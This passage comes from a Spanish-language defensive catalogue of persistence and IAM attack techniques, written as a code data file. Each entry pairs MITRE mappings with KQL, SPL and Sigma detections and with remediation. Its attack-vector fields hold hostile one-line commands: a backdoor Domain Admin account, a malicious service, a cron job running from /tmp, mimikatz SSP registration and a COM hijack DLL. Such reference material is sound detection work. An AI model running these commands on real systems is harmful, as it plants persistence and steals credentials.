    deteccion: {
      kql: 'DeviceRegistryEvents | where RegistryKey contains "CurrentVersion\\Run" and RegistryValueData contains ("Temp" or "AppData" or "Public") | project Timestamp, RegistryKey, RegistryValueData, InitiatingProcessFileName',
      sigma: 'win_registry_run_key_persistence',
      win_event_ids: [11, 12, 13],
    },
    mitigacion_hardening: ['Sysmon registry auditing de las claves de persistencia (con config de SwiftOnSecurity/olafhartong)', 'Baseline + diff de entradas Run legítimas', 'AppLocker bloqueando ejecución desde %APPDATA%'],
    parcheo_remediacion: ['Eliminar las entradas de registry', 'Eliminar binarios referenciados', 'Hunt de todos los cambios en claves de persistencia en la ventana'],
    referencias: ['https://attack.mitre.org/techniques/T1547/001/', 'https://www.andreafortuna.org/dfir/windows-registry-artefacts-persistence/'],
  },
  {
    id: 'PER-003',
    nombre: 'Servicios maliciosos (service installation)',
    categoria: 'Persistence',
    severidad: 'High',
    mitre_attack: ['T1543.003'],
    descripcion_tecnica: 'Crear un servicio Windows propio (sc create / New-Service) que ejecuta el payload como SYSTEM al arrancar. Más robusto que Run keys (no requiere login) y con reconexión automática (recovery options).',
    impacto_iam_soc: 'Persistencia SYSTEM permanente. Señal directa: 7045 (servicio instalado) con binario en ruta de usuario, servicios con nombre/nombre descriptivo que imitan Windows (SvcHostSlot, WindowsHealth), y servicios que apuntan a rundll32/powershell.',
    vector_ataque: ['sc create "WinDefendUpd" binPath= "C:\\Temp\\svc.exe" start= auto obj= LocalSystem'],
    deteccion: {
      kql: 'SecurityEvent | where EventID == 7045 and (ImagePath contains "Temp" or ImagePath contains "AppData" or ImagePath contains "Users\\Public") | project TimeGenerated, ServiceName, ImagePath, SubjectUserName',
      spl: 'index=win EventCode=7045 | regex ImagePath="(?i)(temp|appdata|public|powershell)"',
      sigma: 'win_new_service_creation_suspicious',
      win_event_ids: [7045, 4697],
    },
    mitigacion_hardening: ['Alerta sobre CUALQUIER 7045 en estaciones (en servers correlacionar con cambio)', 'AppLocker/WDAC (el payload no ejecuta aunque se instale el servicio)', 'Restringir SeCreateServicePrivilege'],
    parcheo_remediacion: ['sc delete de los servicios maliciosos', 'Eliminar binarios', 'Hunt 7045 completo de la ventana'],
    referencias: ['https://attack.mitre.org/techniques/T1543/003/', 'https://www.splunk.com/en_us/blog/security/hunting-service-installations.html'],
  },
  {
    id: 'PER-004',
    nombre: 'WMI event subscriptions (persistencia sin archivo)',
    categoria: 'Persistence',
    severidad: 'High',
    mitre_attack: ['T1546.003'],
    descripcion_tecnica: 'Tres objetos WMI (Filter + Consumer + Binding) que ejecutan un comando cuando ocurre un evento (arranque, cada 5 min, login). El payload vive como objeto WMI en el repository (CIM database), no como archivo — evita file-based AV. Herramienta: SharpWMI, wmic /namespace.',
    impacto_iam_soc: 'Persistencia fileless elegante y poco auditada. Los bindings __EventFilter→CommandLineEventConsumer con ActiveXScript o CommandLineTemplate son IoCs por sí mismos. Detección: eventos WMI-Activity (5857-5861) y query del repository (Get-WmiObject -Namespace root\\subscription).',
    vector_ataque: ['__EventFilter con query "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance…"', 'CommandLineEventConsumer ejecutando powershell -enc …'],
    deteccion: {
      kql: 'DeviceProcessEvents | where InitiatingProcessFileName == "WmiPrvSE.exe" and InitiatingProcessCommandLine contains "-enc" | project Timestamp, ProcessCommandLine, InitiatingProcessCommandLine',
      spl: 'index=win sourcetype=XmlWinEventLog:Microsoft-Windows-WMI-Activity/Operational (EventCode=5857 OR EventCode=5860 OR EventCode=5861) | stats count by host',
      sigma: 'win_wmi_event_subscription',
      win_event_ids: [5857, 5860, 5861],
    },
    mitigacion_hardening: ['Auditar el namespace root\\subscription contra baseline (Get-WmiObject CommandLineEventConsumer)', 'WMI-Activity operational logging habilitado', 'Restringir la creación de subscriptions a admins (hardening del namespace)'],
    parcheo_remediacion: ['Eliminar Filter/Consumer/Binding maliciosos', 'Rebuild del repository WMI si está corrupto (rara vez necesario)', 'Hunt de procesos hijos de WmiPrvSE con -enc'],
    referencias: ['https://attack.mitre.org/techniques/T1546/003/', 'https://www.eideon.com/2018-03-02-THL01-WMIBackdoors/'],
  },
  {
    id: 'PER-005',
    nombre: 'Golden Certificate (persistencia via AD CS)',
    categoria: 'Persistence',
    severidad: 'Critical',
    mitre_attack: ['T1649', 'T1550.004'],
    descripcion_tecnica: 'Un certificado de autenticación emitido (por cualquier ESC o compromiso del CA) vale por años y sobrevive a: reset de password del usuario, rotación de krbtgt (¡NO si se firmó nuevo!, sí al resto), y deshabilitado de cuenta en algunos casos (cert mapping). Es la persistencia definitiva en entornos híbridos.',
    impacto_iam_soc: 'El atacante con un cert de DA se autentica cuando quiere (PKINIT o Schannel). Los certificados NO se invalidan con las acciones estándar de respuesta (password reset). Requiere revocación explícita del CA + publicación de CRL. Señal: 4768 con cert info (pre-auth type 15) de cuentas "reseteadas".',
    vector_ataque: ['Certificado emitido vía ESC1-8 (o enrollment legítimo con control de DA)', 'Uso diferido: autenticar cuando el incidente "se cerró"'],
    deteccion: {
      kql: 'SecurityEvent | where EventID == 4768 and PreAuthType == 15 // PKINIT; correlacionar con usuarios con password reciente reseteada usando cert auth',
      win_event_ids: [4768, 4886],
    },
    mitigacion_hardening: ['Auditar TODOS los certificados de autenticación emitidos (CA database) tras cualquier incidente AD', 'Revocar certs sospechosos + CRL con vida corta', 'Restringir plantillas de autenticación (el fix de fondo de ESC1-8)'],
    parcheo_remediacion: ['Revoke + publicar CRL (y verificar que los DCs la consultan)', 'Eliminar el cert del store del atacante si se conoce el host', 'Assume breach: revisar cada TGT emitido con PKINIT en 90 días'],
    referencias: ['https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf', 'https://attack.mitre.org/techniques/T1649/'],
  },
  {
    id: 'PER-006',
    nombre: 'Shadow admin / nuevo DA silencioso',
    categoria: 'Persistence',
    severidad: 'Critical',
    mitre_attack: ['T1098', 'T1136.002'],
    descripcion_tecnica: 'Añadir una cuenta nueva (o modificada) a grupos privilegiados: Domain Admins, Enterprise Admins, o grupos con acceso indirecto (Account Operators, Administrators de un DC, o DACLs sobre objetos Tier-0). Con naming que imita service accounts (svc-backup2$), sobrevive a limpieza superficial.',
    impacto_iam_soc: 'Persistencia visible en ldap pero invisible en operación diaria (nadie audita membresías cada mañana). Los shadow admins son el hallazgo #1 en post-incidente. Señal: 4728/4732/4756 (member added to group) fuera de flujos IT, y cuentas nuevas (4720) que entran a grupos privilegiados.',
    vector_ataque: ['net user svc-backup2 Passw0rd! /add && net group "Domain Admins" svc-backup2 /add'],
    deteccion: {
      kql: 'SecurityEvent | where EventID in (4728, 4732, 4756) and MemberName != "" | project TimeGenerated, SubjectUserName, MemberName, TargetUserName | where TargetUserName contains "Admin" or TargetUserName contains "Admins"',
      spl: 'index=win (EventCode=4728 OR EventCode=4732 OR EventCode=4756) group="*Admin*" | stats count by src_user, member',
      sigma: 'win_add_member_to_privileged_group',
      win_event_ids: [4728, 4732, 4756, 4720],
    },
    mitigacion_hardening: ['JIT/PAM: grupos privilegiados VACÍOS por defecto (miembros solo durante ventanas aprobadas)', 'Alerta sobre cualquier 4728/4732 en grupos Tier-0', 'Revisión diaria automatizada de membresías vs baseline (BloodHound diff)'],
    parcheo_remediacion: ['Desactivar (antes que borrar) las cuentas backdoor', 'Revertir membresías', 'Auditar la actividad completa de las cuentas backdoor (de dónde, a dónde)'],
    referencias: ['https://attack.mitre.org/techniques/T1098/', 'https://stealthbits.com/blog/what-is-a-shadow-admin/'],
  },
  {
    id: 'PER-007',
    nombre: 'OAuth app como persistencia (illicit grant a largo plazo)',
    categoria: 'Persistence',
    severidad: 'High',
    mitre_attack: ['T1098.001', 'T1528'],
    descripcion_tecnica: 'El consent OAuth concedido (ver AUTH-008/CLD-007) es persistencia por diseño: mientras el grant exista, la app del atacante refresca tokens indefinidamente — sin password, sin MFA, sin sesiones visibles del usuario. Sobrevive a password resets.',
    impacto_iam_soc: 'La persistencia cloud favorita: el usuario se siente seguro tras resetear su password y el atacante sigue leyendo su correo. Detección periódica: comparar OAuth grants contra inventario aprobado (Get-AzureADUserOAuth2PermissionGrant).',
    vector_ataque: ['Consent phishing inicial (una vez)', 'Refresh token de la app indefinidamente'],
    deteccion: {
      kql: 'AuditLogs | where OperationName == "Consent to application" | project TimeGenerated, InitiatedBy, TargetResources // más: revisar grants con >90 días de antigüedad sin uso legítimo',
      spl: 'index=o365 Operation="Consent to application." | stats count by AppId, UserId',
    },
    mitigacion_hardening: ['Admin consent workflow + revisión mensual de grants', 'App governance con auto-alertas', 'Lista blanca de apps y block de las demás'],
    parcheo_remediacion: ['Revocar el grant (Remove-AzureADOAuth2PermissionGrant)', 'Reset de sesiones del usuario', 'Bloquear el AppId en el tenant'],
    referencias: ['https://attack.mitre.org/techniques/T1098/001/', 'https://learn.microsoft.com/en-us/defender-office-365/detect-and-remediate-illicit-consent-grants'],
  },
  {
    id: 'PER-008',
    nombre: 'Security Support Provider (SSP DLL / mimikatz SSP)',
    categoria: 'Persistence',
    severidad: 'Critical',
    mitre_attack: ['T1101', 'T1547.002'],
    descripcion_tecnica: 'Insertar una DLL SSP (Security Support Provider) que LSA carga al arranque: mimilib.dll de mimikatz registra todos los logons (passwords en claro) en un archivo. También via registry (Security Packages). Requiere reinicio para activarse — y survivea a todo lo que no sea reconstrucción.',
    impacto_iam_soc: 'Keystroke logger de dominio local: cada autenticación en el host queda registrada. Detectable por: DLLs nuevas en LSA (registry Security Packages), eventos 3033/3062 de LSA (si LSA Protection on), y el archivo wdigest.log/mimilsa.log apareciendo.',
    vector_ataque: ['mimikatz privilege::debug misc::memssp (en memoria) o mimilib.dll persistente', 'reg add HKLM\\SYSTEM\\…\\Lsa /v "Security Packages" /d "mimilib.dll"'],
    deteccion: {
      kql: 'DeviceRegistryEvents | where RegistryKey contains "Security Packages" and RegistryValueData !contains ("kerberos msv1_0 schannel wdigest tspkg pku2u cloudap") | project Timestamp, RegistryValueData, InitiatingProcessFileName',
      sigma: 'win_registry_ssp_persistence',
      win_event_ids: [3033, 3062, 13],
    },
    mitigacion_hardening: ['LSA Protection (RunAsPPL) activo — eventos 3033/3062 avisan de SSPs no firmados', 'Auditar el valor Security Packages del registry', 'AppLocker/WDAC en Lsass-adjacent paths'],
    parcheo_remediacion: ['Quitar la DLL/entrada del registry', 'Reiniciar (el SSP está cargado en LSA)', 'Asumir TODAS las passwords usadas en el host desde la instalación: reset masivo'],
    referencias: ['https://attack.mitre.org/techniques/T1101/', 'https://adsecurity.org/?p=1667'],
  },
  {
    id: 'PER-009',
    nombre: 'Cron / systemd timers (Linux)',
    categoria: 'Persistence',
    severidad: 'High',
    mitre_attack: ['T1053.003', 'T1053.006'],
    descripcion_tecnica: 'En Linux: crontab de usuario, /etc/cron.d, systemd timers (más modernos y menos auditados), .bashrc/.profile (ejecución en login), y udev rules. El payload puede ser un script de 1 línea que descarga la carga real.',
    impacto_iam_soc: 'Persistencia Linux estándar. Los systemd timers son los menos monitorizados (los SOC cazan cron pero no siempre `systemctl list-timers`). Señal: nuevos timers en /etc/systemd/system, crontab con rutas de /tmp o /dev/shm, y bashrc con curl/wget.',
    vector_ataque: ['(crontab -l ; echo "*/5 * * * * /tmp/.upd") | crontab -', 'systemctl enable --now backdoor.timer'],
    deteccion: {
      spl: 'index=nix sourcetype=linux_audit OR sourcetype=syslog (cron OR crond OR systemd) | regex command="(?i)(/tmp|/dev/shm|curl|wget)" | stats count by user, host, command',
    },
    mitigacion_hardening: ['Escribir crontabs/systemd units desde gestión centralizada (Ansible) + alerta de cambios fuera de ella', 'Monitorear /etc/systemd/system y /etc/cron.d con FIM (auditd watch)', 'Bloquear ejecución desde /tmp,/dev/shm (mount noexec)'],
    parcheo_remediacion: ['Eliminar crontabs/timers/servicios maliciosos', 'Eliminar los payloads (buscar en /tmp, /dev/shm, ~/)', 'Rotar claves/creds del host (el payload ya corrió)'],
    referencias: ['https://attack.mitre.org/techniques/T1053/003/', 'https://pwn.no0be.com/Linux-Persistence/'],
  },
  {
    id: 'PER-010',
    nombre: 'COM object hijacking (CLSID)',
    categoria: 'Persistence',
    severidad: 'Medium',
    mitre_attack: ['T1546.015'],
    descripcion_tecnica: 'Sustituir el InProcServer32 de un CLSID usado por procesos legítimos (explorer.exe al arrancar carga una lista enorme) para que cargue la DLL maliciosa. HKCU\\…\\CLSID override (HKCU se procesa antes que HKCR/HKLM). Fileless-looking: el binario legítimo es el que carga tu DLL.',
    impacto_iam_soc: 'Persistencia en user-land sin tocar HKLM: los hunts de siempre (Run keys) no la ven. Cada explorer.exe carga el payload (la DLL se ejecuta con integridad del usuario). Señal: CLSIDs en HKCU con rutas a DLLs fuera de lugares estándar, y Sysmon 10 (process access) + 7 (image load) de explorer cargando DLLs raras.',
    vector_ataque: ['reg add HKCU\\Software\\Classes\\CLSID\\{…}\\InProcServer32 /ve /d "C:\\Temp\\evil.dll" (CLSID de un COM usado por explorer)'],
    deteccion: {
      kql: 'DeviceRegistryEvents | where RegistryKey contains "HKCU\\Software\\Classes\\CLSID" and RegistryKey contains "InProcServer32" | project Timestamp, RegistryKey, RegistryValueData, InitiatingProcessFileName',
      sigma: 'sysmon_com_object_hijacking',
      win_event_ids: [12, 13, 7],
    },
    mitigacion_hardening: ['Baseline de CLSIDs en HKCU (debería estar casi vacío en usuarios estándar)', 'Sysmon registry auditing de CLSID paths', 'AppLocker (la DLL no ejecuta si está bloqueada por regla de DLL rules)'],
    parcheo_remediacion: ['Eliminar las keys CLSID de HKCU', 'Eliminar las DLLs', 'Hunt de DLLs cargadas por explorer desde rutas de usuario'],
    referencias: ['https://attack.mitre.org/techniques/T1546/015/', 'https://www.enigma0x3.net/2017/07/13/com-object-hijacking-bypassing-office-activation/'],
  },
  /* ============================ IAM GENERAL ============================ */
  {
    id: 'IAM-001',
    nombre: 'Role creep / exceso de privilegios (least privilege ausente)',
    categoria: 'IAM',
    severidad: 'High',
    mitre_attack: ['T1078'],
    descripcion_tecnica: 'Acumulación de roles/permisos a lo largo de años de cambios de puesto: el usuario de marketing que fue admin de SharePoint sigue siéndolo. Encuestas anuales (IDSA): el promedio es 3-5x más permisos de los necesarios.',
    impacto_iam_soc: 'Cualquier compromiso de un usuario cualquiera escala a acceso a datos masivos (los permisos ya están). El SOC no puede basar detección en "acceso inusual" porque TODO es técnicamente permitido. La certificación de accesos (recert) no existe o es rubber-stamp.',
    vector_ataque: ['Infostealer en el PC del usuario sobre-permisionado', 'Phishing: la cuenta ya tiene acceso al crown jewels'],
    deteccion: {
      kql: '// análisis no-evento: comparar permisos efectivos vs uso real (UBA/Access Reviews); en cloud: Access Analyzer findings, en AD: Effective Permissions reports',
    },
    mitigacion_hardening: ['Access reviews trimestrales con OBLIGATORIEDAD de justificación (el manager aprueba QUÉ permiso, no "todo")', 'Role mining: re-diseñar roles por tarea real (de-permissioning campaigns)', 'En cloud: permisos granulares por condición (tags, hora, IP) — ABAC en lugar de RBAC gigante'],
    parcheo_remediacion: ['Auditoría de permisos efectivos completos (PIM/PAM reports)', 'Revocación de lo no usado 90+ días (detectado por logs de uso)', 'Migrar accesos humanos a just-in-time'],
    referencias: ['https://csrc.nist.gov/projects/role-based-access-control', 'https://www.cisecurity.org/insights/blog/principle-of-least-privilege'],
  },
  {
    id: 'IAM-002',
    nombre: 'ABAC mal implementado (atributos incorrectos/stale)',
    categoria: 'IAM',
    severidad: 'Medium',
    mitre_attack: ['T1078'],
    descripcion_tecnica: 'ABAC decide por atributos (departamento, clasificación, localización). Si los atributos están desactualizados (el empleado cambió de área pero su atributo "departamento=Finanzas" sigue), hereda accesos que ya no le corresponden. O peor: los usuarios pueden autoseleccionar atributos (self-service mal diseñado).',
    impacto_iam_soc: 'Sistema de autorización "correcto" con datos podridos = mismos fallos que RBAC pero con peor auditabilidad (¿por qué accedió? "porque su atributo decía X"). Los attestations de atributos son la parte que nadie hace.',
    vector_ataque: ['Atributo stale heredado de un puesto anterior', 'Self-asserted attributes en SAML/OIDC claims (el IdP acepta atributos que el usuario rellenó)'],
    deteccion: {
      kql: '// gobierno: comparar fuente de verdad de RRHH vs atributos del IdP (departamento, manager, estado); alertar atributos sin attestation reciente',
    },
    mitigacion_hardening: ['Fuente de verdad única para atributos (HR system) con sync automático', 'Cero self-asserted attributes en claims de identidad', 'Auditoría de atributos usados en decisiones de acceso (logging del PDP)'],
    parcheo_remediacion: ['Sincronizar RRHH→IdP y re-evaluar accesos', 'Revocar accesos basados en atributos corruptos', 'Documentar atributos→permisos para auditabilidad'],
    referencias: ['https://csrc.nist.gov/projects/attribute-based-access-control', 'NIST SP 800-162'],
  },
  {
    id: 'IAM-003',
    nombre: 'Cuentas huérfanas / dormidas sin deshabilitar',
    categoria: 'IAM',
    severidad: 'High',
    mitre_attack: ['T1078.003'],
    descripcion_tecnica: 'Cuentas de ex-empleados/contratistas que quedan activas: sin offboarding real (o con offboarding manual que falla en el 20% de casos), con VPN activa, correo reenviado y permisos intactos. Dormidas = nadie notará un login suyo.',
    impacto_iam_soc: 'Cuentas que nadie usa = perfectas para el atacante: el login no genera "anomalía de comportamiento" porque no hay comportamiento. Los APTs las buscan específicamente (baja prioridad de detección). Señal: cuentas sin actividad 30+ días que de repente loguean.',
    vector_ataque: ['Enumerar cuentas via LinkedIn de ex-empleados + probar credenciales de infostealer de su época', 'Uso directo: nadie monitorea esa cuenta'],
    deteccion: {
      kql: 'SigninLogs | summarize arg_max(TimeGenerated, ResultType) by UserId | where TimeGenerated < ago(30d) and ResultType == 0 | project UserId, TimeGenerated // cuentas que no loguean hace 30d pero están activas; y alertar cuando una dormida despierta',
      spl: 'index=auth | stats latest(_time) as last by user | eval age=now()-last | where age > 2592000 | sort age',
    },
    mitigacion_hardening: ['Offboarding automatizado end-to-end (RRHH → disable → revoke tokens → mailbox → VPN) con checklist verificable', 'Política de deshabilitado automático por inactividad (30-60 días)', 'Revisión mensual de cuentas activas vs nómina'],
    parcheo_remediacion: ['Deshabilitar YA las cuentas huérfanas', 'Auditar logins de cuentas dormidas en los últimos 90 días (¿alguien las usó?)', 'Cerrar los huecos del proceso de offboarding (post-mortem)'],
    referencias: ['https://attack.mitre.org/techniques/T1078/003/', 'https://www.cisecurity.org/controls/controls-v8-implementation-groups'],
  },
  {
    id: 'IAM-004',
    nombre: 'Cuentas genéricas/compartidas',
    categoria: 'IAM',
    severidad: 'High',
    mitre_attack: ['T1078.002'],
    descripcion_tecnica: 'cuenta "admin", "soporte", "scanner", "backup" compartida por 5 personas: sin atribución individual, con la password en un post-it (o en el propio KeePass compartido que ya se filtró). Auditoría imposible: quién hizo qué.',
    impacto_iam_soc: 'El primer principio de IAM roto: non-repudiation. En incidentes, no se puede contener (¿desactivar la cuenta que usan 5 personas y cae producción?). Los atacantes las aman por la misma razón.',
    vector_ataque: ['Leak de la password compartida (una persona la filtra y afecta a todos)', 'Uso interno malicioso sin rastro individual'],
    deteccion: {
      kql: 'SigninLogs | where UserId in (generic_accounts) | summarize dcount(IpAddress), dcount(DeviceId) by UserId, bin(TimeGenerated, 1h) | where dcount_IpAddress > 2 // la cuenta usada simultáneamente desde varias IPs',
    },
    mitigacion_hardening: ['Cero cuentas compartidas: cuenta individual + grupos para la autorización', 'Lo excepcional (break-glass): vaulted (CyberArk/LAPS), checkout con aprobación, expiración', 'Migrar servicios a service accounts dedicadas (una por servicio)'],
    parcheo_remediacion: ['Rotar las passwords y separar en cuentas individuales', 'Auditar el uso histórico de las compartidas (mejor esfuerzo posible)', 'Excepciones documentadas con fecha de caducidad'],
    referencias: ['https://attack.mitre.org/techniques/T1078/002/', 'ISO 27001 A.5.16-A.5.18 (identity management)'],
  },
  {
    id: 'IAM-005',
    nombre: 'Password policy débil / lockout ausente',
    categoria: 'IAM',
    severidad: 'Medium',
    mitre_attack: ['T1110'],
    descripcion_tecnica: 'Complejidad de los 2000 (8 chars + mayúscula + número) que fuerza passwords predecibles (Verano2024!), sin ban-list de passwords comunes, sin lockout (o con lockout configurable a infinito). NIST 800-63B moderno: longitud > complejidad, ban lists, y verificación contra breaches.',
    impacto_iam_soc: 'Los sprays triunfan con las estacionales ("Company2025!"). El lockout ausente permite intentos infinitos. La política "por cumplimiento" (cumplir el checklist) no equivale a seguridad real.',
    vector_ataque: ['Spray con listas estacionales (Winter2025!, Empresa2025#)', 'Cracking offline post-DCSync con reglas de mutación'],
    deteccion: {
      kql: 'SigninLogs | where ResultType == 50126 | summarize count() by UserId, IpAddress, bin(TimeGenerated, 1h) | where count > 20 // sin lockout: intentos masivos por cuenta',
      win_event_ids: [4625, 4771],
    },
    mitigacion_hardening: ['NIST 800-63B: 14+ chars, ban lists (top 1000 + nombres de empresa), permitir passphrases, MFA', 'Smart lockout por IP+dispositivo (no solo por cuenta: evita el DoS del lockout)', 'Verificación de passwords contra breach corpora (HIBP API en el registro/cambio)'],
    parcheo_remediacion: ['Actualizar la política de dominio y de apps', 'Forzar rotación de las passwords de listas comunes (detección offline)', 'Activar lockout inteligente'],
    referencias: ['https://pages.nist.gov/800-63-3/sp800-63b.html', 'https://haveibeenpwned.com/Passwords'],
  },
  {
    id: 'IAM-006',
    nombre: 'Enumeración de usuarios (login/register errors)',
    categoria: 'IAM',
    severidad: 'Low',
    mitre_attack: ['T1592.003', 'T1087'],
    descripcion_tecnica: 'Mensajes distintos para "usuario no existe" vs "password incorrecta", timing attacks (el hash de una cuenta real tarda más), y respuestas de registro ("ese email ya está registrado"). El atacante mapea cuentas válidas para sprays y phishing dirigido.',
    impacto_iam_soc: 'Prepara el ataque real (spray/phishing) con listas de usuarios confirmadas. En AD: Kerberos pre-auth errors (KRB_ERR 6) y 4768 con nombres inexistentes delatan la enumeración. Es el paso 0 de todo BEC.',
    vector_ataque: ['Timing: comparar latencia de login entre usuarios válidos/inválidos', 'Respuestas de forgot-password ("enviamos un email" vs "no existe esa cuenta")'],
    deteccion: {
      kql: 'SigninLogs | where ResultType == 50034 // user not found; ratio alto de 50034 vs 50126 desde una IP = enumeración',
      spl: 'index=auth result="user_not_found" | stats count by src | where count > 50',
      win_event_ids: [4768, 4625],
    },
    mitigacion_hardening: ['Mensajes genéricos idénticos para ambos casos ("credenciales inválidas")', 'Constant-time en validación de usuarios (siempre hashear/comparar)', 'Rate limiting con CAPTCHA progresivo'],
    parcheo_remediacion: ['Unificar mensajes de error', 'Bloquear las IPs de enumeración', 'Asumir que la lista de usuarios ya salió: preparar detección de spray'],
    referencias: ['https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/03-Identity_Management_Testing/04-Testing_for_Account_Enumeration_and_Guessable_User_Account', 'https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html'],
  },
  {
    id: 'IAM-007',
    nombre: 'MFA ausente para cuentas privilegiadas',
    categoria: 'IAM',
    severidad: 'Critical',
    mitre_attack: ['T1078', 'T1550'],
    descripcion_tecnica: 'Admins de dominio, cloud, DBAs y otros tier-0 sin MFA (por "el MFA rompe mis scripts", "es la cuenta del servicio", o simple omisión). Una credencial = acceso total sin segunda prueba de identidad.',
    impacto_iam_soc: 'Es el single point of failure del entero modelo: la seguridad de todo el entorno depende de UNA password. Los ataques de credenciales (spray/stealer/phishing) prueban contra los admins primero. Case study: Colonial Pipeline (password de VPN sin MFA).',
    vector_ataque: ['Password del admin en un infostealer log', 'Spray dirigido (los admins tienen nombres predecibles en el email)'],
    deteccion: {
      kql: 'SigninLogs | where UserId in (privileged_users) and AuthenticationRequirement == "singleFactorAuthentication" and ResultType == 0 | project TimeGenerated, UserId, AppDisplayName, IPAddress // logins exitosos SIN MFA de admins',
      spl: 'index=auth user IN (admins) mfa=false outcome=success | stats count by user, app',
      win_event_ids: [4624],
    },
    mitigacion_hardening: ['MFA antiphishing (FIDO2/WHfB) obligatorio para TODA cuenta privilegiada — sin excepciones', 'Separación: cuentas admin dedicadas (nombre-admin) con MFA, separadas del uso diario', 'Conditional Access + PIM: elevación solo con MFA fresco'],
    parcheo_remediacion: ['Habilitar MFA YA en las cuentas sin él', 'Rotar las passwords de esas cuentas (asumir compromiso previo)', 'Auditar logins históricos single-factor de admins'],
    referencias: ['https://www.cisa.gov/sites/default/files/publications/CISA_Insights_Implementing_Phishing-Resistant_MFA.pdf', 'https://attack.mitre.org/techniques/T1078/'],
  },
  {
    id: 'IAM-008',
    nombre: 'Service account con password nunca rotada',
    categoria: 'IAM',
    severidad: 'High',
    mitre_attack: ['T1552.001', 'T1078'],
    descripcion_tecnica: 'Cuentas de servicio con la misma password desde 2017: la conoce el consultor que ya no está, está en documentación interna, en el installer del producto y quizá en el SYSVOL. Nadie rota porque "no sabemos qué se rompe".',
    impacto_iam_soc: 'Credenciales de vida infinita con privilegios de servicio (a menudo elevados). Al comprometerse (un solo leak), el acceso es permanente hasta rotación manual. La edad promedio de passwords de service accounts supera los 3 años.',
    vector_ataque: ['Leak vía documentación/instaladores antiguos', 'Kerberoasting (ver AD-001): las passwords viejas caen primero'],
    deteccion: {
      kql: '// AD: Get-ADUser -Filter {PasswordNeverExpires -eq $true -and Enabled -eq $true} -Properties PasswordLastSet | donde PasswordLastSet < 2 años; 4769 con SPN de la cuenta (uso actual)',
      win_event_ids: [4769],
    },
    mitigacion_hardening: ['gMSA (rotación automática) para TODO servicio compatible', 'Password 30+ chars manual + rotación anual documentada para lo no-gMSA', 'Inventario de service accounts con owner, propósito y última rotación'],
    parcheo_remediacion: ['Rotar YA las más viejas/privilegiadas (plan de ventana: lo que depende de la cuenta)', 'Migrar a gMSA donde el servicio lo permita', 'Hunt de uso de las cuentas en la ventana previa (¿ya se usó mal?)'],
    referencias: ['https://learn.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview', 'https://attack.mitre.org/techniques/T1552/001/'],
  },
  {
    id: 'IAM-009',
    nombre: 'Endpoints admin expuestos sin autorización server-side',
    categoria: 'IAM',
    severidad: 'Critical',
    mitre_attack: ['T1190'],
    descripcion_tecnica: 'BFFs y APIs con endpoints administrativos (/admin/*, debug consoles, actuator/Spring, adminer, phpMyAdmin) que solo se "ocultan" en el frontend (security by obscurity) o dependen de network position (están en la DMZ "interna"). Sin check de rol server-side.',
    impacto_iam_soc: 'Cualquier usuario autenticado (o nadie) ejecuta acciones admin: cambiar roles, leer logs, ejecutar comandos. Los actuator endpoints de Spring expuestos (heapdump incluye sesiones) son hallazgo perenne en bug bounty.',
    vector_ataque: ['GET /actuator/heapdump (leer tokens/sessions del dump)', 'POST /api/admin/users/roles con token de usuario normal'],
    deteccion: {
      kql: 'AppHttpRequest | where Uri contains ("/admin" or "/actuator" or "/debug") and HttpStatusCode == 200 and CallerRoles !contains "admin" | summarize count() by CallerUserId, Uri',
      spl: 'index=web uri="*/admin/*" OR uri="*/actuator*" status=200 | stats count by user, uri',
    },
    mitigacion_hardening: ['Autorización server-side por defecto en cada endpoint (deny-by-default middleware)', 'Exponer actuator/admin solo en interfaz interna (management port separado)', 'Eliminar endpoints debug de producción (build flags)'],
    parcheo_remediacion: ['Añadir los checks de rol faltantes', 'Rotar tokens/sesiones presentes en heapdumps expuestos', 'Auditar el uso histórico de los endpoints expuestos'],
    referencias: ['https://owasp.org/API-Security/editions/2023/en/0xa5-broken-function-level-authorization/', 'https://docs.spring.io/spring-boot/docs/current/reference/html/actuator.html'],
  },
  {
    id: 'IAM-010',
    nombre: 'Auto-membresía de grupos privilegiados (self-service)',
    categoria: 'IAM',
    severidad: 'High',
    mitre_attack: ['T1098'],
    descripcion_tecnica: 'Flujos de identidad que permiten al usuario pedirse a sí mismo (u otra cuenta) la entrada a grupos privilegiados: self-service portal de AD con approvals automáticos, Entra ID con "self-service group management" mal configurado, o group owners que son los propios miembros.',
    impacto_iam_soc: 'Escalada de privilegio con la bendición del proceso: el usuario entra al grupo por la puerta principal (el evento de membership parece un flujo aprobado). En Entra: los grupos con "owners can manage membership" son el vector si el owner es un usuario comprometido.',
    vector_ataque: ['SSPR/group self-service: el atacante compromete al owner del grupo y se añade', 'Workflow de aprobación con auto-aprobación (el solicitante es también aprobador)'],
    deteccion: {
      kql: 'AuditLogs | where OperationName == "Add member to group" and InitiatedBy.user.userPrincipalName == TargetResources[0].userPrincipalName | project TimeGenerated, InitiatedBy, TargetResources // self-service additions a grupos',
      win_event_ids: [4728, 4732, 4756],
    },
    mitigacion_hardening: ['Grupos privilegiados: SIN self-service ni owners de negocio (solo PIM con aprobadores independientes)', 'Separación de deberes: quien solicita ≠ quien aprueba ≠ el owner del grupo', 'Alertas de auto-adición (initiator == target)'],
    parcheo_remediacion: ['Quitar los permisos de autogestión de grupos privilegiados', 'Auditar membresías añadidas por flujos self-service', 'Revertir memberships sospechosas'],
    referencias: ['https://learn.microsoft.com/en-us/entra/identity/users/groups-self-service-management', 'https://attack.mitre.org/techniques/T1098/'],
  },
  {
    id: 'IAM-011',
    nombre: 'Credenciales por defecto del fabricante',
    categoria: 'IAM',
    severidad: 'Critical',
    mitre_attack: ['T1078.001'],
    descripcion_tecnica: 'admin/admin, admin/<vacío>, root/root en impresoras, cámaras, NAS, firewalls, iLO/iDRAC, VPN appliances y IoT. Shodan/indexa estos portales. Mientras tanto el equipo de red "no tenía constancia" del equipo.',
    impacto_iam_soc: 'Acceso inicial sin exploit: solo login. Los botnets (Mirai y sucesores) barren Internet por esto. En la red interna: pivot desde el IoT al segmento corporativo. Señal: logins exitosos en equipos sin usuario asignado y desde IPs inesperadas.',
    vector_ataque: ['Shodan: "default password" + firmware del appliance', 'Login con credenciales de fábrica (nunca cambiadas)'],
    deteccion: {
